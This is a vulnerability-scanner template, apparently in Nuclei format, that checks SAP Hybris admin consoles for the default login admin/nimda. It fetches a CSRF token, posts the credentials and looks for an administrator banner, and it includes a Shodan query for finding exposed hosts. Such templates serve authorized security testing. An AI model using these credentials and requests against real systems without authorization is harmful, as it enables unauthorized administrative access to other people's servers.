http:
- attack: clusterbomb
  extractors:
  - group: 1
    internal: true
    name: csrftoken
    part: body
    regex:
    - <meta name="_csrf" content="([a-z0-9-]+)" \/>
    type: regex
  host-redirects: true
  matchers:
  - condition: and
    type: word
    words:
    - hybris administration console
    - You're Administrator
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  payloads:
    password:
    - nimda
    path:
    - /
    - /hac/
    - /hmc/
    username:
    - admin
  raw:
  - 'GET {{path}}login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST {{path}}j_spring_security_check HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}login


    j_username={{username}}&j_password={{password}}&_csrf={{csrftoken}}

    '
  - 'GET {{path}} HTTP/1.1

    Host: {{Hostname}}

    '
  skip-variables-check: true
  stop-at-first-match: true
id: hybris-default-login
info:
  author: princechaddha
  classification:
    cpe: cpe:2.3:a:sap:hybris:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: Hybris contains a default login vulnerability. An attacker can obtain
    access to user accounts and access sensitive information, modify data, and/or
    execute unauthorized operations.
  metadata:
    max-request: 3
    product: hybris
    shodan-query: title:"Hybris"
    vendor: sap
    verified: true
  name: Hybris - Default Login
  severity: high
  tags: default-login,hybris,vuln
